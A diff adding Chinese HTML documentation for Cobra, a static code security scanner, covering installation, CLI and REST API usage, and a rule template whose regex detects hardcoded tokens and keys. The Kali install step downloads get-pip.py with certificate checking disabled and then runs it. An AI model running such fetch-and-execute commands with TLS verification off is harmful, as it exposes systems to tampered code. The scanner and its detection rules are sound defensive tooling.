+对于一些特征较为明显的可以使用正则规则来直接进行匹配出，比如硬编码密码、错误的配置等。 对于OWASP Top 10的漏洞，Cobra通过预先梳理能造成危害的函数，并定位代码中所有出现该危害函数的地方，继而基于Lex(Lexical Analyzer Generator, 词法分析生成器)和Yacc(Yet Another Compiler-Compiler, 编译器代码生成器)将对应源代码解析为AST(Abstract Syntax Tree, 抽象语法树)，分析危害函数的入参是否可控来判断是否存在漏洞（目前仅接入了PHP-AST，其它语言AST接入中）。
+</p>
+
+<p>
+<b>Cobra和其它源代码审计系统有什么区别或优势</b>
+</p>
+
+<p>
+Cobra定位是自动化发现源代码中大部分显著的安全问题，对于一些隐藏较深或特有的问题建议人工审计。
+</p>
+
+<ul class="org-ul">
+<li>开发源代码（基于开放的MIT License，可更改源码）</li>
+<li>支持开发语言多（支持十多种开发语言和文件类型）</li>
+<li>支持漏洞类型多（支持数十种漏洞类型）</li>
+<li>支持各种场景集成（提供API也可以命令行使用）</li>
+<li>专业支持，持续维护（由白帽子、开发工程师和安全工程师一起持续维护更新，并在多家企业内部使用）
+<ul class="org-ul">
+<li>现在也不维护了，但在开源里是个比较出名的工具。</li>
+</ul></li>
+</ul>
+
+<p>
+<b>Cobra支持哪些开发语言</b>
+</p>
+
+<p>
+目前Cobra主要支持PHP、Java等主要开发语言及其它数十种文件类型，并持续更新规则和引擎以支持更多开发语言，具体见支持的<a href="http://cobra.feei.cn/languages">开发语言和文件类型</a>。
+</p>
+
+<p>
+<b>Cobra能发现哪些漏洞</b>
+</p>
+
+<p>
+覆盖大部分Web端常见漏洞和一些移动端（Android、iOS）通用漏洞，具体见支持的<a href="http://cobra.feei.cn/labels">漏洞类型</a>。
+</p>
+</div>
+</div>
+<div id="outline-container-h:a4e1c5e6-566a-4df5-8ac1-f937427e5906" class="outline-3">
+<h3 id="h:a4e1c5e6-566a-4df5-8ac1-f937427e5906"><a href="#h:a4e1c5e6-566a-4df5-8ac1-f937427e5906">Installation(安装)</a></h3>
+<div class="outline-text-3" id="text-h:a4e1c5e6-566a-4df5-8ac1-f937427e5906">
+<p>
+<b>系统支持</b>
+</p>
+
+<ul class="org-ul">
+<li>mac OS 支持</li>
+<li>Linux 支持</li>
+<li>Windows 暂不支持</li>
+</ul>
+
+<p>
+<b>Kali安装python2 pip</b>
+</p>
+
+<p>
+使用kali系统自带的python2.7时，需要下载pip2.7；
+1.更新apt源
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">vim /etc/apt/sources.list
+</pre>
+</div>
+
+<p>
+2.下载pip2.7
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter"># </span><span class="org-comment">&#19979;&#36733;pip2.7
+</span>wget --no-check-certificate <span class="org-string">'https://bootstrap.pypa.io/pip/2.7/get-pip.py'</span>
+python2 get-pip.py
+</pre>
+</div>
+
+<p>
+<b>安装方法</b>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">git clone https://github.com/WhaleShark-Team/cobra.git &amp;&amp; <span class="org-builtin">cd</span> cobra
+pip install -r requirements.txt
+python cobra.py --help
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:307d6dd6-29d4-4567-a347-1cc8936c1391" class="outline-3">
+<h3 id="h:307d6dd6-29d4-4567-a347-1cc8936c1391"><a href="#h:307d6dd6-29d4-4567-a347-1cc8936c1391">CLI模式</a></h3>
+<div class="outline-text-3" id="text-h:307d6dd6-29d4-4567-a347-1cc8936c1391">
+<p>
+<b>Examples（使用例子）</b>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter"># </span><span class="org-comment">&#25195;&#25551;&#19968;&#20010;&#25991;&#20214;&#22841;&#30340;&#20195;&#30721;
+</span>python cobra.py -t tests/vulnerabilities
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">&#25195;&#25551;&#19968;&#20010;Git&#39033;&#30446;&#20195;&#30721;
+</span>python cobra.py -t https://github.com/FeeiCN/grw.git
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">&#25195;&#25551;&#19968;&#20010;&#25991;&#20214;&#22841;&#65292;&#24182;&#23558;&#25195;&#25551;&#32467;&#26524;&#23548;&#20986;&#20026;JSON&#25991;&#20214;
+</span>python cobra.py -t tests/vulnerabilities -f json -o /tmp/report.json
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">&#25195;&#25551;&#19968;&#20010;Git&#39033;&#30446;&#65292;&#24182;&#23558;&#25195;&#25551;&#32467;&#26524;JSON&#25991;&#20214;&#25512;&#36865;&#21040;API&#19978;
+</span>python cobra.py -f json -o http://push.to.com/api -t https://github.com/FeeiCN/vc.git
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">&#25195;&#25551;&#19968;&#20010;Git&#39033;&#30446;&#65292;&#24182;&#23558;&#25195;&#25551;&#32467;&#26524;JSON&#25991;&#20214;&#21457;&#36865;&#21040;&#37038;&#31665;&#20013;
+</span>python cobra.py -f json -o feei@feei.cn -t https://github.com/FeeiCN/grw.git
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">&#25195;&#25551;&#19968;&#20010;&#25991;&#20214;&#22841;&#20195;&#30721;&#30340;&#26576;&#20004;&#31181;&#28431;&#27934;
+</span>python cobra.py -t tests/vulnerabilities -r cvi-190001,cvi-190002
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">&#24320;&#21551;&#19968;&#20010;Cobra HTTP Server&#65292;&#28982;&#21518;&#21487;&#20197;&#20351;&#29992;API&#25509;&#21475;&#26469;&#28155;&#21152;&#25195;&#25551;&#20219;&#21153;
+</span>python cobra.py -H 127.0.0.1 -P 8888
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">&#26597;&#30475;&#29256;&#26412;
+</span>python cobra.py --version
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">&#26597;&#30475;&#24110;&#21161;
+</span>python cobra.py --help
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">&#25195;&#25551;&#19968;&#20010;Git&#39033;&#30446;&#65292;&#25195;&#25551;&#23436;&#27605;&#33258;&#21160;&#21024;&#38500;&#32531;&#23384;
+</span>python cobra.py -t http://github.com/xx/xx.git -dels
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">&#25195;&#25551;gitlab&#20840;&#37096;&#39033;&#30446;&#65292;&#37197;&#32622;&#22909;config&#20013;private_token&#65292;gitlab_url&#65292;cobra_ip
+</span>python git_projects.py
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">&#33258;&#21160;&#29983;&#25104;Cobra&#25195;&#25551;&#21608;&#25253;&#21457;&#36865;&#33267;&#25351;&#23450;&#37038;&#31665;&#65292;&#38656;&#35201;&#37197;&#32622;&#22909;config&#20013;&#30340;SMTP&#26381;&#21153;&#22120;&#20449;&#24687;
+</span>python cobra.py -rp
+</pre>
+</div>
+
+<p>
+<b>Help（帮助）</b>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">&#9492;&#9472;# python2 cobra.py -h
+usage: cobra [-h] [-t &lt;target&gt;] [-f &lt;format&gt;] [-o &lt;output&gt;] [-r &lt;rule_id&gt;]                                                    
+             [-d] [-sid SID] [-dels] [-rp] [-m] [-H &lt;host&gt;] [-P &lt;port&gt;]                                                       
+                                                                                                                              
+    ,---.     |                                                                                                               
+    |    ,---.|---.,---.,---.                                                                                                 
+    |    |   ||   ||    ,---|                                                                                                 
+    <span class="org-sh-quoted-exec">`---``---``---``    `</span>---^ v2.0.0-alpha.5                                                                                  
+                                                                                                                              
+GitHub: https://github.com/WhaleShark-Team/cobra                                                                              
+                                                                                                                              
+Cobra is a static code analysis system that automates the detecting vulnerabilities and security issue.                       
+                                                                                                                              
+optional arguments:
+  -h, --help            show this help message and exit
+
+Scan:
+  -t &lt;target&gt;, --target &lt;target&gt;
+                        file, folder, compress, or repository address
+  -f &lt;format&gt;, --format &lt;format&gt;
+                        vulnerability output format (formats: json, csv, xml)
+  -o &lt;output&gt;, --output &lt;output&gt;
+                        vulnerability output STREAM, FILE, HTTP API URL, MAIL
+  -r &lt;rule_id&gt;, --rule &lt;rule_id&gt;
+                        specifies rules e.g: CVI-100001,cvi-190001
+  -d, --debug           open debug mode
+  -sid SID, --sid SID   scan id(API)
+  -dels, --dels         del target directory True or False
+  -rp, --report         automation report Cobra data
+  -m, --md5             Create projects file md5
+
+RESTful:
+  -H &lt;host&gt;, --host &lt;host&gt;
+                        REST-JSON API Service Host
+  -P &lt;port&gt;, --port &lt;port&gt;
+                        REST-JSON API Service Port
+
+Usage:
+  python cobra.py -t tests/vulnerabilities
+  python cobra.py -t tests/vulnerabilities -r cvi-190001,cvi-190002
+  python cobra.py -t tests/vulnerabilities -f json -o /tmp/report.json 
+  python cobra.py -t https://github.com/ethicalhack3r/DVWA -f json -o feei@feei.cn 
+  python cobra.py -t https://github.com/ethicalhack3r/DVWA -f json -o http://push.to.com/api 
+  python cobra.py -H 127.0.0.1 -P 8888
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:771fffa9-b016-451d-8d04-9b4158278426" class="outline-3">
+<h3 id="h:771fffa9-b016-451d-8d04-9b4158278426"><a href="#h:771fffa9-b016-451d-8d04-9b4158278426">API接口</a></h3>
+<div class="outline-text-3" id="text-h:771fffa9-b016-451d-8d04-9b4158278426">
+<p>
+<b>添加扫描任务</b>
+</p>
+
+<ul class="org-ul">
+<li>请求接口
+<ul class="org-ul">
+<li>接口： /api/add</li>
+<li>方法： POST</li>
+<li>类型： JSON</li>
+</ul></li>
+
+<li>请求参数</li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-sh">&#21442;&#25968; &#31867;&#22411; &#24517;&#22635;  &#25551;&#36848; &#20363;&#23376;
+
+key  string &#26159; config &#25991;&#20214;&#20013;&#37197;&#32622;&#30340;secret_key
+{<span class="org-string">"key"</span>:<span class="org-string">"your_secret_key"</span>}
+
+target  string&#25110;list  &#26159;  &#38656;&#35201;&#25195;&#25551;&#30340;git&#22320;&#22336;&#65292;&#40664;&#35748;&#20026;master&#20998;&#25903;&#65292;&#22914;&#38656;&#25351;&#23450;&#20998;&#25903;&#25110;tag&#21487;&#22312;git&#22320;&#22336;&#26411;&#23614;&#21152;&#19978; :master
+&#21333;&#20010;&#39033;&#30446;&#25195;&#25551;&#65306; {<span class="org-string">"target"</span>: <span class="org-string">"https://github.com/FeeiCN/dict.git:master"</span>} &#65307;
+&#22810;&#20010;&#39033;&#30446;&#25195;&#25551;&#65306; {<span class="org-string">"target"</span>: [<span class="org-string">"https://github.com/FeeiCN/dict.git:master"</span>,<span class="org-string">"https://github.com/FeeiCN/autossh.git:master"</span>]}
+
+rule string &#21542; &#20165;&#25195;&#25551;&#25351;&#23450;&#35268;&#21017;&#65292;&#20197;,&#20998;&#38548;
+{<span class="org-string">"rule"</span>: <span class="org-string">"cvi-130003,cvi-130004"</span>}
+</pre>
+</div>
+
+<ul class="org-ul">
+<li>响应例子</li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-sh">{
+    <span class="org-string">"code"</span>: 1001, <span class="org-comment-delimiter"># </span><span class="org-comment">&#29366;&#24577;&#30721;&#20026;1001&#21017;&#34920;&#31034;&#36923;&#36753;&#22788;&#29702;&#27491;&#24120;
+</span>    <span class="org-string">"result"</span>: {
+        <span class="org-string">"msg"</span>: <span class="org-string">"Add scan job successfully."</span>, <span class="org-comment-delimiter"># </span><span class="org-comment">&#28040;&#24687;
+</span>        <span class="org-string">"sid"</span>: <span class="org-string">"a938e2y2vnkf"</span>, <span class="org-comment-delimiter"># </span><span class="org-comment">&#25195;&#25551;&#30340;&#20219;&#21153;ID&#65288;&#35843;&#29992;&#20219;&#21153;&#29366;&#24577;&#26597;&#35810;&#26102;&#38656;&#35201;&#29992;&#21040;&#65289;
+</span>        <span class="org-string">"total_target_num"</span>: 1 <span class="org-comment-delimiter"># </span><span class="org-comment">&#25195;&#25551;&#20219;&#21153;&#30340;&#39033;&#30446;&#24635;&#25968;
+</span>    }
+}
+</pre>
+</div>
+
+<p>
+<b>查询扫描任务状态</b>
+</p>
+
+<ul class="org-ul">
+<li>请求接口
+<ul class="org-ul">
+<li>接口： /api/status 方法： POST 类型： JSON</li>
+</ul></li>
+
+<li>请求参数</li>
+</ul>
+
+<div class="org-src-container">
+<pre class="src src-sh">&#21442;&#25968; &#31867;&#22411; &#24517;&#22635; &#25551;&#36848; &#20363;&#23376;
+key string &#26159; config &#25991;&#20214;&#20013;&#37197;&#32622;&#30340; secret_key
+{<span class="org-string">"key"</span>:<span class="org-string">"your_secret_key"</span>}
+
+sid string &#26159; &#25195;&#25551;&#30340;&#20219;&#21153;ID
+</pre>
+</div>
+
+<ul class="org-ul">
+<li>响应例子</li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-sh">{
+    <span class="org-string">"code"</span>: 1001, <span class="org-comment-delimiter"># </span><span class="org-comment">&#29366;&#24577;&#30721;&#20026;1001&#21017;&#34920;&#31034;&#36923;&#36753;&#22788;&#29702;&#27491;&#24120;
+</span>    <span class="org-string">"result"</span>: {
+        <span class="org-string">"msg"</span>: <span class="org-string">"success"</span>, <span class="org-comment-delimiter"># </span><span class="org-comment">&#28040;&#24687;
+</span>        <span class="org-string">"not_finished"</span>: 0, <span class="org-comment-delimiter"># </span><span class="org-comment">&#26410;&#23436;&#25104;&#30340;&#39033;&#30446;&#25968;
+</span>        <span class="org-string">"report"</span>: <span class="org-string">"http://127.0.0.1/?sid=ae3ea90pkoo5"</span>, <span class="org-comment-delimiter"># </span><span class="org-comment">&#25195;&#25551;&#25253;&#21578;&#39029;
+</span>        <span class="org-string">"sid"</span>: <span class="org-string">"ae3ea90pkoo5"</span>, <span class="org-comment-delimiter"># </span><span class="org-comment">&#25195;&#25551;&#30340;&#20219;&#21153;ID
+</span>        <span class="org-string">"allow_deploy"</span>: true, <span class="org-comment-delimiter"># </span><span class="org-comment">&#26159;&#21542;&#20801;&#35768;&#21457;&#24067;&#19978;&#32447;
+</span>        <span class="org-string">"statistic"</span>: { <span class="org-comment-delimiter"># </span><span class="org-comment">&#39640;&#20013;&#20302;&#21361;&#28431;&#27934;&#25968;&#37327;
+</span>            <span class="org-string">"high"</span>: 5,
+            <span class="org-string">"medium"</span>: 18,
+            <span class="org-string">"critical"</span>: 0,
+            <span class="org-string">"low"</span>: 28
+        },
+        <span class="org-string">"status"</span>: <span class="org-string">"done"</span>, <span class="org-comment-delimiter"># </span><span class="org-comment">&#25195;&#25551;&#29366;&#24577;
+</span>        <span class="org-string">"still_running"</span>: {}, <span class="org-comment-delimiter"># </span><span class="org-comment">&#27491;&#22312;&#25195;&#25551;&#30340;&#39033;&#30446;
+</span>        <span class="org-string">"total_target_num"</span>: 1, <span class="org-comment-delimiter"># </span><span class="org-comment">&#25195;&#25551;&#20219;&#21153;&#30340;&#39033;&#30446;&#24635;&#25968;
+</span>    }
+}
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:b5c50eaf-045d-4dd8-aa97-fee9586e8fde" class="outline-3">
+<h3 id="h:b5c50eaf-045d-4dd8-aa97-fee9586e8fde"><a href="#h:b5c50eaf-045d-4dd8-aa97-fee9586e8fde">完整的例子</a></h3>
+<div class="outline-text-3" id="text-h:b5c50eaf-045d-4dd8-aa97-fee9586e8fde">
+<p>
+<b>启动HTTP服务</b>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">python cobra.py -H 127.0.0.1 -P 8888
+<span class="org-comment-delimiter"># </span><span class="org-comment">&#21551;&#21160;&#20043;&#21069;&#38656;&#20808;&#29983;&#25104; config &#37197;&#32622;&#25991;&#20214;
+</span><span class="org-comment-delimiter"># </span><span class="org-comment">cp config.template config</span>
+</pre>
+</div>
+
+<p>
+<b>添加扫描任务</b>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter"># </span><span class="org-comment">&#28155;&#21152;&#19968;&#26465;&#20219;&#21153;
+</span>curl -H <span class="org-string">"Content-Type: application/json"</span> -X POST http://127.0.0.1:8888/api/add -d <span class="org-string">'{"key":"your_secret_key","target":"https://github.com/FeeiCN/grw.git:master", "rule": "cvi-130003,cvi-130004"}'</span> 
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">&#28155;&#21152;&#22810;&#26465;&#20219;&#21153;
+</span>curl -H <span class="org-string">"Content-Type: application/json"</span> -X POST -d <span class="org-string">'{"key":"your_secret_key","target":["https://github.com/WhaleShark-Team/cobra.git:master","https://github.com/FeeiCN/grw.git:master"]}'</span> http://127.0.0.1:8888/api/add
+</pre>
+</div>
+
+<p>
+<b>查询任务状态</b>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">curl -H <span class="org-string">"Content-Type: application/json"</span> -X POST -d <span class="org-string">'{"key":"your_secret_key","sid":"a938e29vdse8"}'</span> http://127.0.0.1:8888/api/status
+</pre>
+</div>
+
+<p>
+<b>Web 指定时间段漏洞统计</b>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">http://127.0.0.1:8888/report
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:c25e0a91-72b6-4664-9d0b-2e7a141b5f66" class="outline-3">
+<h3 id="h:c25e0a91-72b6-4664-9d0b-2e7a141b5f66"><a href="#h:c25e0a91-72b6-4664-9d0b-2e7a141b5f66">Flow（规则编写流程）</a></h3>
+<div class="outline-text-3" id="text-h:c25e0a91-72b6-4664-9d0b-2e7a141b5f66">
+<ol class="org-ol">
+<li>编写规则文件CVI-XXXNNN.xml
+<ul class="org-ul">
+<li>参考 <a href="http://cobra.feei.cn/rule_name">规则命名</a> 建立规则文件。</li>
+<li>参考 <a href="http://cobra.feei.cn/rule_template">规则模板</a> 和 <a href="http://cobra.feei.cn/rule_demo">规则样例</a> 编写对应的规则、修复方案、测试用例等。</li>
+</ul></li>
+
+<li>编写漏洞代码tests/vulnerabilities/v.language
+<ul class="org-ul">
+<li>编写实际可能出现的业务场景代码（只需编写一处即可）。</li>
+</ul></li>
+
+<li>测试规则扫描python cobra.py -t tests/vulnerabilities/
+<ul class="org-ul">
+<li>测试扫描结果</li>
+</ul></li>
+</ol>
+</div>
+</div>
+<div id="outline-container-h:df846e5b-888a-439e-bc63-a70964cf8a48" class="outline-3">
+<h3 id="h:df846e5b-888a-439e-bc63-a70964cf8a48"><a href="#h:df846e5b-888a-439e-bc63-a70964cf8a48">Rule Template（规则模板）</a></h3>
+<div class="outline-text-3" id="text-h:df846e5b-888a-439e-bc63-a70964cf8a48">
+<div class="org-src-container">
+<pre class="src src-xml"><span class="org-nxml-processing-instruction-delimiter">&lt;?</span><span class="org-nxml-processing-instruction-target">xml</span> <span class="org-nxml-processing-instruction-content">version="1.0" encoding="UTF-8"</span><span class="org-nxml-processing-instruction-delimiter">?&gt;</span>
+<span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">cobra</span> <span class="org-nxml-attribute-local-name">document</span>=<span class="org-string">"https://github.com/WhaleShark-Team/cobra"</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">name</span> <span class="org-nxml-attribute-local-name">value</span>=<span class="org-string">"&#30828;&#32534;&#30721;Token/Key"</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">language</span> <span class="org-nxml-attribute-local-name">value</span>=<span class="org-string">"*"</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">match</span> <span class="org-nxml-attribute-local-name">mode</span>=<span class="org-string">"regex-only-match"</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-cdata-section-delimiter">&lt;![</span><span class="org-nxml-cdata-section-cdata">CDATA</span><span class="org-nxml-cdata-section-delimiter">[</span><span class="org-nxml-cdata-section-content">(?![\d]{32})(?![a-fA-F]{32})([a-f\d]{32}|[A-F\d]{32})</span><span class="org-nxml-cdata-section-delimiter">]]&gt;</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">match</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">level</span> <span class="org-nxml-attribute-local-name">value</span>=<span class="org-string">"2"</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">test</span><span class="org-nxml-tag-delimiter">&gt;</span>
+    <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">case</span> <span class="org-nxml-attribute-local-name">assert</span>=<span class="org-string">"true"</span> <span class="org-nxml-attribute-local-name">remark</span>=<span class="org-string">"sha1"</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-cdata-section-delimiter">&lt;![</span><span class="org-nxml-cdata-section-cdata">CDATA</span><span class="org-nxml-cdata-section-delimiter">[</span><span class="org-nxml-cdata-section-content">"41a6bc4d9a033e1627f448f0b9593f9316d071c1"</span><span class="org-nxml-cdata-section-delimiter">]]&gt;</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">case</span><span class="org-nxml-tag-delimiter">&gt;</span>
+    <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">case</span> <span class="org-nxml-attribute-local-name">assert</span>=<span class="org-string">"true"</span> <span class="org-nxml-attribute-local-name">remark</span>=<span class="org-string">"md5 lower"</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-cdata-section-delimiter">&lt;![</span><span class="org-nxml-cdata-section-cdata">CDATA</span><span class="org-nxml-cdata-section-delimiter">[</span><span class="org-nxml-cdata-section-content">"d042343e49e40f16cb61bd203b0ce756"</span><span class="org-nxml-cdata-section-delimiter">]]&gt;</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">case</span><span class="org-nxml-tag-delimiter">&gt;</span>
+    <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">case</span> <span class="org-nxml-attribute-local-name">assert</span>=<span class="org-string">"true"</span> <span class="org-nxml-attribute-local-name">remark</span>=<span class="org-string">"md5 upper"</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-cdata-section-delimiter">&lt;![</span><span class="org-nxml-cdata-section-cdata">CDATA</span><span class="org-nxml-cdata-section-delimiter">[</span><span class="org-nxml-cdata-section-content">C787AFE9D9E86A6A6C78ACE99CA778EE</span><span class="org-nxml-cdata-section-delimiter">]]&gt;</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">case</span><span class="org-nxml-tag-delimiter">&gt;</span>
+    <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">case</span> <span class="org-nxml-attribute-local-name">assert</span>=<span class="org-string">"false"</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-cdata-section-delimiter">&lt;![</span><span class="org-nxml-cdata-section-cdata">CDATA</span><span class="org-nxml-cdata-section-delimiter">[</span><span class="org-nxml-cdata-section-content">please like and subscribe to my</span><span class="org-nxml-cdata-section-delimiter">]]&gt;</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">case</span><span class="org-nxml-tag-delimiter">&gt;</span>
+    <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">case</span> <span class="org-nxml-attribute-local-name">assert</span>=<span class="org-string">"false"</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-cdata-section-delimiter">&lt;![</span><span class="org-nxml-cdata-section-cdata">CDATA</span><span class="org-nxml-cdata-section-delimiter">[</span><span class="org-nxml-cdata-section-content">A32efC32c79823a2123AA8cbDDd3231c</span><span class="org-nxml-cdata-section-delimiter">]]&gt;</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">case</span><span class="org-nxml-tag-delimiter">&gt;</span>
+    <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">case</span> <span class="org-nxml-attribute-local-name">assert</span>=<span class="org-string">"false"</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-cdata-section-delimiter">&lt;![</span><span class="org-nxml-cdata-section-cdata">CDATA</span><span class="org-nxml-cdata-section-delimiter">[</span><span class="org-nxml-cdata-section-content">ffffffffffffffffffffffffffffffff</span><span class="org-nxml-cdata-section-delimiter">]]&gt;</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">case</span><span class="org-nxml-tag-delimiter">&gt;</span>
+    <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">case</span> <span class="org-nxml-attribute-local-name">assert</span>=<span class="org-string">"false"</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-cdata-section-delimiter">&lt;![</span><span class="org-nxml-cdata-section-cdata">CDATA</span><span class="org-nxml-cdata-section-delimiter">[</span><span class="org-nxml-cdata-section-content">01110101001110011101011010101001</span><span class="org-nxml-cdata-section-delimiter">]]&gt;</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">case</span><span class="org-nxml-tag-delimiter">&gt;</span>
+    <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">case</span> <span class="org-nxml-attribute-local-name">assert</span>=<span class="org-string">"false"</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-cdata-section-delimiter">&lt;![</span><span class="org-nxml-cdata-section-cdata">CDATA</span><span class="org-nxml-cdata-section-delimiter">[</span><span class="org-nxml-cdata-section-content">00000000000000000000000000000000</span><span class="org-nxml-cdata-section-delimiter">]]&gt;</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">case</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">test</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">solution</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-text">
+    ## &#23433;&#20840;&#39118;&#38505;
+    &#30828;&#32534;&#30721;&#23494;&#30721;
+
+    ## &#20462;&#22797;&#26041;&#26696;
+    &#23558;&#23494;&#30721;&#25277;&#20986;&#32479;&#19968;&#25918;&#22312;&#37197;&#32622;&#25991;&#20214;&#20013;&#65292;&#37197;&#32622;&#25991;&#20214;&#19981;&#25918;&#22312;git&#20013;
+  </span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">solution</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">status</span> <span class="org-nxml-attribute-local-name">value</span>=<span class="org-string">"on"</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-tag-delimiter">&gt;</span>
+  <span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">author</span> <span class="org-nxml-attribute-local-name">name</span>=<span class="org-string">"Feei"</span> <span class="org-nxml-attribute-local-name">email</span>=<span class="org-string">"feei@feei.cn"</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-tag-delimiter">&gt;</span>
+<span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">cobra</span><span class="org-nxml-tag-delimiter">&gt;</span>
+</pre>
+</div>
+
+<p>
+<b>规则字段规范</b>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">&#23383;&#27573;&#65288;&#33521;&#25991;&#65289;   &#23383;&#27573;&#65288;&#20013;&#25991;&#65289;  &#26159;&#21542;&#24517;&#22635;  &#31867;&#22411; &#25551;&#36848; &#20363;&#23376;
+
+name
+&#35268;&#21017;&#21517;&#31216;&#12290;&#26159; string &#25551;&#36848;&#35268;&#21017;&#21517;&#31216;
+&lt;name <span class="org-variable-name">value</span>=<span class="org-string">"Logger&#25935;&#24863;&#20449;&#24687;"</span> /&gt;
+
+language
+&#35268;&#21017;&#35821;&#35328;  &#26159; string  &#35774;&#32622;&#35268;&#21017;&#38024;&#23545;&#30340;&#24320;&#21457;&#35821;&#35328;&#65292;&#21442;&#35265;languages
+&lt;language <span class="org-variable-name">value</span>=<span class="org-string">"php"</span> /&gt;
+
+match
+&#21305;&#37197;&#35268;&#21017;1 &#26159; string &#21305;&#37197;&#35268;&#21017;1
+&lt;match <span class="org-variable-name">mode</span>=<span class="org-string">"regex-only-match"</span>&gt;&lt;![CDATA[regex content]]&gt;&lt;/match&gt;
+
+match2
+&#21305;&#37197;&#35268;&#21017;2 &#21542; string &#21305;&#37197;&#35268;&#21017;2
+&lt;match2 <span class="org-variable-name">block</span>=<span class="org-string">"in-function-up"</span>&gt;&lt;![CDATA[regex content]]&gt;&lt;/match2&gt;
+
+repair
+&#20462;&#22797;&#35268;&#21017;  &#21542; string&#21305;&#37197;&#21040;&#27492;&#35268;&#21017;&#65292;&#21017;&#19981;&#31639;&#20570;&#28431;&#27934;
